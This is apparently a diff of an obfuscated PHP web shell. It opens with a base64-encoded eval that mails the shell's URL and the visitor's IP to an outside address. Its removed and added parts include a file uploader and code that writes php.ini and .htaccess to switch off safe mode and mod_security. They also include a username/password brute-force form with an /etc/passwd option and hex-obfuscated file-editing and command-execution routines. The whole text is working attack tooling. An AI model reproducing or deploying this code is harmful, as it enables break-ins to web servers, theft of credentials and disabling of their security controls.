eval(base64_decode("\112\x48\122\61\141\x6e\x56\x68\x62\x6d\x31\x68\x61\x57\167\x67\x50\x53\x41\156\141\62\x46\163\141\130\147\167\x65\107\x46\x73\141\127\164\x41\132\62\61\x68\141\x57\x77\x75\131\x32\71\x74\112\x7a\x73\113\112\x48\150\146\143\107\106\60\x61\x43\101\71\111\x43\x4a\157\x64\110\x52\x77\117\151\70\x76\x49\151\101\x75\111\x43\x52\x66\125\60\x56\123\126\x6b\126\x53\127\x79\x64\124\x52\126\112\127\122\126\112\146\x54\153\106\116\122\x53\x64\144\111\x43\x34\147\112\x46\x39\x54\122\x56\112\x57\122\126\112\x62\112\x31\112\x46\x55\x56\x56\106\125\61\122\x66\x56\x56\x4a\112\112\x31\60\67\103\x69\x52\x77\x5a\x58\x4e\x68\142\154\x39\x68\142\x47\x56\x79\x64\x43\101\71\111\x43\112\x6d\141\x58\x67\x67\x4a\110\x68\x66\143\107\x46\60\141\x43\x41\x36\x63\x43\101\x71\123\x56\101\147\121\x57\122\x6b\143\x6d\126\172\143\x79\101\x36\x49\106\163\x67\111\x69\101\x75\x49\103\122\x66\x55\60\126\x53\x56\153\126\123\127\171\144\123\x52\x55\61\120\126\x45\126\146\x51\125\122\x45\x55\151\x64\144\111\x43\64\147\111\151\x42\144\111\152\x73\x4b\142\x57\106\160\x62\x43\147\153\x64\110\126\161\144\x57\106\x75\x62\x57\106\160\142\x43\x77\147\111\153\116\x76\x62\x6e\x52\x68\x59\x33\121\x67\124\x57\x55\x69\x4c\x43\101\x6b\143\107\x56\172\x59\127\x35\146\131\127\170\x6c\x63\x6e\x51\x73\111\103\112\x62\x49\103\111\x67\x4c\x69\x41\153\130\x31\116\x46\x55\154\132\106\x55\154\163\x6e\x55\x6b\x56\116\x54\61\122\x46\x58\60\106\105\122\106\111\x6e\130\x53\x41\165\111\x43\x49\x67\130\x53\x49\x70\117\x77\x3d\75")); goto dzQzZ; yhFst: echo "\x20\x3c\143\x65\x6e\164\x65\162\x3e\40\74\57\143\145\156\164\x65\162\76"; goto KsgZY; dzQzZ: ?>
+
+
+ <form method="POST" target="_blank">
+  <strong>
+   <input name="page" type="hidden" value="find">
+
+   </tr>
    <tr>
-   <td valign="top" bgcolor="#151515" style="width: 139px"><strong></strong></td>
-   <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="show"></strong></td>
-       </tr>
- <input name="page" type="hidden" value="show">
+   <td>
+   <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
+   <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
+  <strong>User :</strong></td>
+   <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="40" rows="10" name="usernames"></textarea></strong></td>
+   </tr>
+   <tr>
+   <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
+  <strong>Pass :</strong></td>
+   <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="40" rows="10" name="passwords"></textarea></strong></td>
+   </tr>
+
+   <tr>
+   <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
+  <strong>Type :</strong></td>
+   <td valign="top" bgcolor="#151515" colspan="5">
+   <span class="style2"><strong>Simple : </strong> </span>
+  <strong>
+  <input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
+   <font class="style2"><strong>/etc/passwd : </strong> </font>
+  <strong>
+  <input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
+  </span>
+   </td>
+   </tr>
+   <tr>
+   <td valign="top" bgcolor="#151515" style="width: 139px"></td>
+   <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="start">
+
+   </td>
+   <tr>
  </form>
 
-     <tr>
-   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Tools</strong></td>
-       </tr>
-    <tr>
-   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Upload</strong></td>
-   <td valign="top" bgcolor="#151515" colspan="5">
-  <strong>
-<?php
-echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
-if( $_POST['_upl'] == "Upload" ) {
- if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUCSES :) !!!</b><br><br>'; }
- else { echo '<b>Upload Failed :( !!!</b><br><br>'; }
-}
-?>
-     <tr>
-   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Server Info</strong></td>
-       </tr>
-    <tr>
-   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Safe Mode</strong></td>
-   <td valign="top" bgcolor="#151515" colspan="5">
-  <strong>
- <?php
- $safe_mode = ini_get('safe_mode');
- if($safe_mode=='1')
- {
- echo 'ON';
- }else{
- echo 'OFF';
- }
-
- ?>
-  </strong>
-  </td>
-       </tr>
-
-          <tr>
-   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Uname</strong></td>
-   <td valign="top" bgcolor="#151515" colspan="5">
-<?php
-echo '<b><br>'.php_uname().'<br></b>';
-?>
-</tr>
-</td>
-
-                <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Kill Safe Mode</strong></td>
-   <td valign="top" bgcolor="#151515" colspan="5">
-<strong>
-
-<?php
-echo "<right>";
-echo"<FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'>
- <p align='center'>
- <INPUT type='submit' name='Kill' value='if Safe Mode is On Clic Here To Kill The SafeMode [ini.php] [php.ini] [.htaccess]' id=input style='font-size: 12pt; font-weight: bold; border-style: inset; border-width: 1px'></p>
-</form>
-";
-echo "<right/>";
-if  (empty($_POST['Kill'] ) ) {
- }ELSE{
- $action = '?action=Kill';
-echo "<html>
-<br>
-<head>
-<meta http-equiv='pragma' content='no-cache'>
-</head><body>";
-
-$fp = fopen("php.ini","w+");
-fwrite($fp,"safe_mode = Off
-disable_functions  =    NONE
-open_basedir = OFF ");
-echo "<b>[SafeMode Done] .. :) This Script Is Coded By Akram Stelle (Dz Mafia Team)</b>";
-echo ("<br>");
-
-$fp2 = fopen(".htaccess","w+");
-fwrite($fp2,"
-<IfModule mod_security.c>
-KillFilterEngine Off
-KillFilterScanPOST Off
-KillFilterCheckURLEncoding Off
-KillFilterCheckUnicodeEncoding Off
-</IfModule>
-");
+<form method=post>
+<input type=submit name="usre" value="Get Usernames & Config !" /></form>
 
 
-echo "<b>[Mod_Security Done]</b><br>";
-
-    echo "<font><center></td></tr><table> ";
-
- }
-?>
-
-</strong>
-</tr>
-</td>
-<tr>
-
-  <tr>
-   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>SerVer Search</strong></td>
-   <td valign="top" bgcolor="#151515" colspan="5">
-  <strong>
-<?php
 
 
-echo " <center> </center>";
-$serverIP = gethostbyname($_SERVER["HTTP_HOST"]);
-echo "Server IP = <font color=red>".gethostbyname($_SERVER["HTTP_HOST"])."
- </font>[</span>
- <a href='http://bing.com/search?q=ip:".$serverIP."&go=&form=QBLH&filt=all' target=\"_blank\">Bing Search</a>][</span><a href='http://zone-h.com/archive/ip=".$serverIP."' target=\"_blank\">Zone-H Search</a>]<center>";
-?>
+<?php  goto qUn3W; IumfL: if ($_POST["\160\x61\x67\145"] == "\145\x64\x69\x74") { $code = @str_replace("\xd\12", "\12", $_POST["\x63\x6f\144\x65"]); $code = @str_replace("\x5c", '', $code); $fp = fopen($pathclass, "\x77"); fwrite($fp, "{$code}"); fclose($fp); echo "\x3c\143\145\156\x74\x65\x72\x3e\x3c\x62\x3e\117\113\40\105\x64\151\164\74\x62\162\x3e\74\142\162\x3e\74\142\162\x3e\x3c\142\x72\76\x3c\x61\40\x68\x72\145\x66\75" . $_SERVER["\120\110\120\137\123\x45\114\x46"] . "\x3e\102\101\x43\113\74\57\x61\76"; die; } goto MmdQ6; zXD4H: if ($_POST["\160\141\x67\x65"] == "\143\143\155\155\x64\x64") { echo ccmmdd($ccmmdd2, $att); die; } goto S7Oz9; U6NRr: if (empty($_POST["\x4b\x69\154\x6c"])) { } else { $action = "\x3f\141\143\x74\151\x6f\x6e\x3d\x4b\151\154\x6c"; echo "\74\x68\x74\x6d\154\x3e\xa\x3c\x62\162\x3e\12\x3c\x68\x65\x61\144\x3e\xa\x3c\155\145\164\x61\x20\150\x74\164\160\x2d\x65\161\165\x69\166\75\x27\160\x72\141\147\155\x61\x27\40\x63\x6f\156\x74\145\156\164\75\x27\156\x6f\55\x63\141\143\150\x65\47\x3e\xa\74\57\150\x65\141\x64\76\x3c\142\157\x64\171\76"; $fp = fopen("\160\x68\160\x2e\x69\x6e\151", "\x77\x2b"); fwrite($fp, "\163\x61\x66\145\137\x6d\157\x64\145\x20\x3d\x20\117\146\x66\xa\x64\x69\x73\x61\142\x6c\x65\137\x66\165\x6e\x63\x74\x69\157\156\163\40\x20\75\x20\40\40\40\x4e\x4f\116\105\12\x6f\x70\x65\156\137\142\x61\163\145\144\151\x72\40\x3d\40\x4f\x46\106\40"); echo "\x3c\x62\76\133\123\141\146\145\x4d\x6f\144\145\40\x44\157\156\145\135\x20\x2e\x2e\40\72\51\40\124\150\x69\x73\40\x53\143\162\151\x70\x74\x20\x49\x73\x20\x43\x6f\x64\x65\x64\40\x42\x79\40\x41\x6b\x72\141\155\x20\x53\164\x65\x6c\154\145\40\50\x44\172\x20\115\141\146\x69\141\40\124\x65\x61\x6d\51\x3c\57\x62\76"; echo "\74\142\162\76"; $fp2 = fopen("\56\150\x74\x61\143\x63\145\163\x73", "\x77\x2b"); fwrite($fp2, "\12\x3c\x49\146\115\x6f\x64\x75\154\x65\40\x6d\x6f\x64\x5f\163\145\x63\165\x72\x69\164\x79\56\143\x3e\12\113\x69\x6c\154\106\x69\x6c\x74\145\162\x45\156\x67\x69\156\x65\x20\117\x66\x66\12\x4b\x69\154\x6c\106\151\x6c\x74\145\162\x53\143\141\156\x50\117\123\x54\40\117\146\x66\12\113\x69\154\x6c\x46\x69\154\164\x65\x72\x43\150\145\x63\153\125\122\114\105\x6e\x63\x6f\144\x69\x6e\147\40\x4f\146\146\12\113\151\x6c\154\106\151\154\x74\145\162\103\x68\x65\143\153\125\x6e\151\x63\x6f\x64\x65\105\156\143\x6f\x64\x69\156\147\x20\117\x66\146\xa\74\x2f\111\x66\115\x6f\x64\165\x6c\x65\x3e\12"); echo "\x3c\x62\76\133\x4d\157\144\137\123\x65\143\165\162\x69\164\171\40\x44\157\156\145\135\x3c\57\x62\76\74\142\162\76"; echo "\x3c\146\157\x6e\164\76\74\143\x65\156\x74\x65\x72\x3e\74\57\164\x64\76\74\x2f\164\x72\x3e\x3c\x74\x61\142\154\145\76\40"; } goto Q_sWr; P90pG: ?>
 </strong>
 </tr>
 </td>
